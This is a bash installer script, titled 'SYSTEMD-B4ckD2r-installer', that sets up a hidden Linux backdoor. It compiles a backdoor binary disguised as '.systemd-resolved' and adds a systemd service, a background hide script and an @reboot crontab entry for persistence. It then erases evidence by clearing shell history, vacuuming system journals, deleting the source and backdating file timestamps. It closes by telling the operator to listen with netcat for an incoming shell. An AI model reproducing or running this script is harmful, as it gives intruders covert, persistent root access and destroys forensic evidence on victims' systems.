#!/bin/bash

BOLD='\033[1m'
GREEN='\033[1;92m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
YELLOW='\033[1;93m'
RED='\033[1;91m'
CYAN='\033[1;96m'
PINK='\033[1;38;5;205m'
ORANGE='\033[1;38;5;214m'
RESET='\033[0m'

CHECK="[+]"
ARROW="->"
GEAR="[*]"
FOLDER="[+]"
START="[*]"
HIDDEN="[*]"
LOCK="[*]"
TERMINAL="[*]"
SUCCESS="[+]"
ROCKET="[+]"

echo -e "${PURPLE}==========================================${RESET}"
echo -e "${PINK}${BOLD}     SYSTEMD-B4ckD2r-installer v1.0${RESET}"
echo -e "${CYAN}${BOLD}   Advanced Backdoor Setup -${RESET}"
echo -e "${PURPLE}==========================================${RESET}"
echo ""

echo -e "${YELLOW}${BOLD}[${GEAR}] Updating and installing required packages...${RESET}"
apt-get update
apt-get install -y gcc make build-essential
apt-get install -y netcat-openbsd
apt-get install -y curl wget
echo -e "${GREEN}${BOLD}${CHECK} Updated and packages installed successfully!${RESET}"
echo ""

echo -e "${YELLOW}${BOLD}[${FOLDER}] Step 2: Compiling backdoor...${RESET}"
gcc -o /usr/local/bin/.systemd-resolved backdoor.c -Wall -O2 -ldl -pthread
chmod 755 /usr/local/bin/.systemd-resolved
chown root:root /usr/local/bin/.systemd-resolved
echo -e "${GREEN}${BOLD}${CHECK} Backdoor compiled successfully!${RESET}"
echo -e "${CYAN}${BOLD}${ARROW} Location: /usr/local/bin/.systemd-resolved${RESET}"
echo ""

echo -e "${YELLOW}${BOLD}[${FOLDER}] Step 3: Moving files...${RESET}"
mv System.service /etc/systemd/system/ 2>/dev/null
mv systemd-linux /usr/local/bin/systemd-linux 2>/dev/null
chmod +x /usr/local/bin/systemd-linux
echo -e "${GREEN}${BOLD}${CHECK} Files moved successfully!${RESET}"
echo -e "${CYAN}${BOLD}${ARROW} Service: /etc/systemd/system/System.service${RESET}"
echo -e "${CYAN}${BOLD}${ARROW} Script: /usr/local/bin/systemd-linux${RESET}"
echo ""

echo -e "${YELLOW}${BOLD}[${START}] Step 4: Enabling systemd service...${RESET}"
systemctl daemon-reload
systemctl enable System.service 2>/dev/null
systemctl start System.service 2>/dev/null
echo -e "${GREEN}${BOLD}${CHECK} Service enabled and started!${RESET}"
echo -e "${CYAN}${BOLD}${ARROW} Status: $(systemctl is-active System.service)${RESET}"
echo ""

echo -e "${YELLOW}${BOLD}[${HIDDEN}] Step 5: Starting hide script...${RESET}"
nohup /usr/local/bin/systemd-linux > /dev/null 2>&1 &
echo -e "${GREEN}${BOLD}${CHECK} Hide script running in background!${RESET}"
echo -e "${CYAN}${BOLD}${ARROW} PID: $(pgrep -f systemd-linux | head -1)${RESET}"
echo ""

echo -e "${YELLOW}${BOLD}[${LOCK}] Step 6: Adding to crontab...${RESET}"
(crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/systemd-linux > /dev/null 2>&1 &") | crontab -
echo -e "${GREEN}${BOLD}${CHECK} Crontab entry added!${RESET}"
echo -e "${CYAN}${BOLD}${ARROW} @reboot /usr/local/bin/systemd-linux${RESET}"
echo ""

echo -e "${YELLOW}${BOLD}[${TERMINAL}] Step 7: Cleaning traces...${RESET}"
history -c 2>/dev/null
cat /dev/null > ~/.bash_history 2>/dev/null
cat /dev/null > /root/.bash_history 2>/dev/null
journalctl --rotate 2>/dev/null
journalctl --vacuum-time=1s 2>/dev/null
rm -f backdoor.c 2>/dev/null
touch -t 202001011200 /usr/local/bin/.systemd-resolved 2>/dev/null
touch -t 202001011200 /etc/systemd/system/System.service 2>/dev/null
touch -t 202001011200 /usr/local/bin/systemd-linux 2>/dev/null
echo -e "${GREEN}${BOLD}${CHECK} Traces cleaned!${RESET}"
echo ""

echo -e "${PURPLE}==========================================${RESET}"
echo -e "${GREEN}${BOLD}${SUCCESS} ALL STEPS COMPLETED SUCCESSFULLY!${RESET}"
echo -e "${CYAN}${BOLD}${ARROW} Backdoor is running and hidden${RESET}"
echo -e "${PINK}${BOLD}${ARROW} Connect with: nc -lvnp 51234${RESET}"
echo -e "${ORANGE}${BOLD}${ROCKET} System ready for connection!${RESET}"
echo -e "${PURPLE}==========================================${RESET}"
